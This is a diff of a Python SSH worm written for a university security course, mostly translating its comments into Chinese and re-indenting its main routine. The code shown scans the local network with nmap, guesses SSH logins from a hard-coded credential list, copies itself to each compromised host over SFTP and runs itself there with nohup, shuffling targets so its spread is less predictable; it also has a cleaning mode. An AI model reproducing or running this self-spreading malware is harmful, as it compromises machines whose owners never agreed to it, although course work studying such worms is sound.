@@ -5,13 +5,19 @@
 # Oscar Castaneda (CWID: 888837614)
 # Assignmnet 3 - Python Worm Program
 ##################################################################
+# SSH 連線模組
 import paramiko
+# 當前系統內部溝通模組(sys call)
 import sys
+# 主從式遠端TCP/IP連線模組
 import socket
+# 端口掃描程序模組(scanning ip/port)
 import nmap
+# ip數據提供延伸模組
 import netinfo
+# 作業系統操作介面模組
 import os
-
+# 系統接口配置監看模組
 import netifaces
 import random
 
@@ -23,15 +29,15 @@ credList = [
     ('cpsc', 'cpsc'),
 ]
 
-# The file marking whether the worm should spread
+# 是否應該散播蠕蟲的標記檔案
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 WORM_FILE = "/tmp/worm.py"
 
 LOOPBACK_INTERFACE = "lo"
 HOST_MARKER_FILE = "/home/cpsc/host_system.txt"
 
-WORM_MSG =  ("                     /)      \n" +
-			"  .-\"\"--.....__...,-'/     \n" +
+WORM_MSG = ("                       /)    \n" +
+			"  .-\"\"--.....__...,-' /    \n" +
 			" ( (\"\"\"`----......--'     \n" +
 			"  `.`._                      \n" +
 			"    `-.`-.                   \n" +
@@ -43,7 +49,7 @@ COMPROMISED_MSG = u"\u2620 \u2620 \u2620 Too Late . . . . Already Infected \u262
 CLEANING_MODE = False
 
 ##################################################################
-# Returns whether the worm should spread
+# 返回蠕蟲是否應該傳播
 # @param sftpClient - SFTP client object 
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
@@ -54,13 +60,14 @@ def isInfectedSystem( sftpClient ):
 	# you created when you marked the system
 	# as infected).
 	try:
-		sftpClient.stat( INFECTED_MARKER_FILE )		# Check if remote host is infected
+		# Check if remote host is infected
+		sftpClient.stat( INFECTED_MARKER_FILE )
 		return True
 	except IOError:
 		return False
 
 #################################################################
-# Marks the system as infected
+# 將系統標記為已感染
 #################################################################
 def markInfected( ):
 	# Mark the system as infected. One way to do
@@ -73,7 +80,7 @@ def markInfected( ):
 	infected_tag.close()
 
 ###############################################################
-# Spread to the other system and execute
+# 傳播到其他系統並執行
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
@@ -98,8 +105,7 @@ def spreadAndExecute( sshClient, sftpClient ):
 
 
 ############################################################
-# Try to connect to the given host given the existing
-# credentials
+# 嘗試連接到給定主機與給定現有cred
 # @param host - the host system domain or IP
 # @param userName - the user name
 # @param password - the password
@@ -141,7 +147,7 @@ def tryCredentials( host, userName, password, sshClient ):
 
 
 ###############################################################
-# Wages a dictionary attack against the host
+# 對主機發起字典攻擊
 # @param host - the host to attack
 # @return - the instace of the SSH paramiko class and the
 # credentials that work in a tuple (ssh, username, password).
@@ -180,7 +186,7 @@ def attackSystem( host ):
 	return None
 
 ####################################################
-# Returns the IP of the current system
+# 返回當前系統的IP
 # @param interface - the interface whose IP we would
 # like to know
 # @return - The IP address of the current system
@@ -195,7 +201,7 @@ def getMyIP( interface ):
 
 
 #######################################################
-# Returns the list of systems on the same network
+# 返回同一網絡上的系統列表
 # @return - a list of IP addresses on the same network
 #######################################################
 def getHostsOnTheSameNetwork( ):
@@ -208,7 +214,7 @@ def getHostsOnTheSameNetwork( ):
 	return portScanner.all_hosts()
 
 ###############################################################
-# Checks if a systems is infected and if so executed the clean
+# 檢查系統是否被感染，如果被感染則執行清理
 # functionality to the connected system
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
@@ -226,110 +232,105 @@ def clean_mess( sshClient, sftpClient ):
 	sshClient.exec_command( "nohup python /tmp/worm.py --clean" )
 
 ###############################################################
-# Returns the file path where worm.py is located and None if
-# not found
+# 返回worm.py所在的文件路徑，如未找到返回None
 # @param file_name - File name being searched for
 ###############################################################
 def find_file( file_name ):
-	# This is to get the directory that the program  
-	# is currently running in. 
+	# This is to get the directory that the program 
+	# is currently running in.
 	dir_path = os.path.dirname(os.path.realpath(__file__)) 
-	  
-	for root, dirs, files in os.walk(dir_path): 
-	    for file in files:  
-	        if file.endswith('.py'): 
-	            return (root+'/'+str(file_name))
-    return None
 
-    # If we are being run without a command line parameters, 
-    # then we assume we are executing on a victim system and
-    # will act maliciously. This way, when you initially run the 
-    # worm on the origin system, you can simply give it some command
-    # line parameters so the worm knows not to act maliciously
-    # on attackers system. If you do not like this approach,
-    # an alternative approach is to hardcode the origin system's
-    # IP address and have the worm check the IP of the current
-    # system against the hardcoded IP.
+	for root, dirs, files in os.walk(dir_path):
+		
+		for file in files:
+	    	
+			if file.endswith('.py'):
+	        	
+				return (root + '/' + str(file_name))
 
-    if len( sys.argv ) < 2 and not os.path.exists( HOST_MARKER_FILE ):
-        # If we are running on the victim, check if 
-        # the victim was already infected. If so, terminate.
-        # Otherwise, proceed with malice.
-        if os.path.exists( INFECTED_MARKER_FILE ):
-            sys.exit()
+	return None
 
-        # Mark Infected and Proceed with proceed with distributing worm
-        try:
-            print("[ TAGGING . . . ]")
-            markInfected( )
-        except:
-            tagging_error = sys.exc_info()[0]
-            print(tagging_error)
+"""
+如果我們在沒有命令行參數的情況下運行，那麼我們假設我們正在受害系統上執行並且會採取惡意行動。
+這樣，當您最初在源系統上運行蠕蟲時，您可以簡單地給它一些命令行參數，這樣蠕蟲就知道不會對攻擊者係統進行惡意操作。
+如果您不喜歡這種方法，另一種方法是對源系統的 IP 地址進行硬編碼，並讓蠕蟲根據硬編碼的 IP 檢查當前系統的 IP。
+"""
+if len( sys.argv ) < 2 and not os.path.exists( HOST_MARKER_FILE ):
+    # 如果我們在受害者身上運行，請檢查受害者是否已經被感染。如果是則終止，否則繼續惡意。
+    if os.path.exists( INFECTED_MARKER_FILE ):
+        sys.exit()
 
-    if any( arg in ( "-c", "--clean" ) for arg in sys.argv):
-        print("[CLEANING MODE . . . ")
-        CLEANING_MODE = True
-        # If not host file delete files and keep executing script loaded into memory
-        # No need to check if files exist becasue if script is executed on infected system that is becasue 
-        # files are here
-        if not os.path.exists( HOST_MARKER_FILE ):
-            os.remove("/tmp/infected.txt")
-            os.remove("/tmp/worm.py")
+    # 標記感染並繼續分發蠕蟲
+    try:
+        print("[ TAGGING . . . ]")
+        markInfected( )
+    except:
+        tagging_error = sys.exc_info()[0]
+        print(tagging_error)
 
-    interface_list = netifaces.interfaces()
-    interface_list.remove( LOOPBACK_INTERFACE )
+if any( arg in ( "-c", "--clean" ) for arg in sys.argv):
+    print("[CLEANING MODE . . . ")
+    CLEANING_MODE = True
+    # 如果不是主機文件，則刪除文件並繼續執行加載到內存中的腳本。
+    # 無需檢查文件是否存在，因為腳本是否在受感染的系統上執行是因為文件在這裡
+    if not os.path.exists( HOST_MARKER_FILE ):
+        os.remove("/tmp/infected.txt")
+        os.remove("/tmp/worm.py")
 
-    for interface in interface_list:
-        print("Interface: ", interface)
-        # Get the IP of the current system
-        ip_addr = getMyIP( interface )
+interface_list = netifaces.interfaces()
+interface_list.remove( LOOPBACK_INTERFACE )
 
-        # Get the hosts on the same network
-        networkHosts = getHostsOnTheSameNetwork()
+for interface in interface_list:
+    print("Interface: ", interface)
+    # Get the IP of the current system
+    ip_addr = getMyIP( interface )
 
-        # Remove the IP of the current system
-        # from the list of discovered systems (we
-        # do not want to target ourselves!).
-        networkHosts.remove( ip_addr )
+    # Get the hosts on the same network
+    networkHosts = getHostsOnTheSameNetwork()
 
-        # Randomly shuffle hosts to make spread not predictable
-        random.shuffle( networkHosts )
+    # Remove the IP of the current system
+    # from the list of discovered systems (we
+    # do not want to target ourselves!).
+    networkHosts.remove( ip_addr )
 
-        print("Found hosts: ", networkHosts)
+    # Randomly shuffle hosts to make spread not predictable
+    random.shuffle( networkHosts )
 
-        # Go through the network hosts
-        for host in networkHosts:
-            # Try to attack this host
-            sshInfo =  attackSystem( host )
+    print("Found hosts: ", networkHosts)
+
+    # Go through the network hosts
+    for host in networkHosts:
+        # Try to attack this host
+        sshInfo =  attackSystem( host )
             
-            print(sshInfo)
+        print(sshInfo)
             
-            # Attack succeeded
-            if sshInfo:
-                print("Credentials Found.\n[ CONNECTING . . . ]")
+        # Attack succeeded
+        if sshInfo:
+            print("Credentials Found.\n[ CONNECTING . . . ]")
 
-                sftp_client = sshInfo[0].open_sftp()
+            sftp_client = sshInfo[0].open_sftp()
 
-                # Check if the system was	
-                # already infected. This can be
-                # done by checking whether the
-                # remote system contains /tmp/infected.txt
-                # file (which the worm will place there
-                # when it first infects the system)
-                if CLEANING_MODE:
-                    print("[ REMOVING WORM . . . . ]")
-                    clean_mess( sshInfo[0], sftp_client )
+            # Check if the system was	
+            # already infected. This can be
+            # done by checking whether the
+            # remote system contains /tmp/infected.txt
+            # file (which the worm will place there
+            # when it first infects the system)
+            if CLEANING_MODE:
+                print("[ REMOVING WORM . . . . ]")
+                clean_mess( sshInfo[0], sftp_client )
+            else:
+                if not isInfectedSystem( sftp_client ):
+                    # If the system was already infected proceed.
+                    # Otherwise, infect the system and terminate.
+                    # Infect that system
+                    try:
+                        print("[ INFECTING . . . . ]")
+                        spreadAndExecute( sshInfo[0], sftp_client )
+                    except:
+                        infecting_error = sys.exc_info()[0]
+                        print(infecting_error)
                 else:
-                    if not isInfectedSystem( sftp_client ):
-                        # If the system was already infected proceed.
-                        # Otherwise, infect the system and terminate.
-                        # Infect that system
-                        try:
-                            print("[ INFECTING . . . . ]")
-                            spreadAndExecute( sshInfo[0], sftp_client )
-                        except:
-                            infecting_error = sys.exc_info()[0]
-                            print(infecting_error)
-                    else:
-                        print("[ WORM ALREADY FOUND ]")
-                sftp_client.close()
+                    print("[ WORM ALREADY FOUND ]")
+            sftp_client.close()
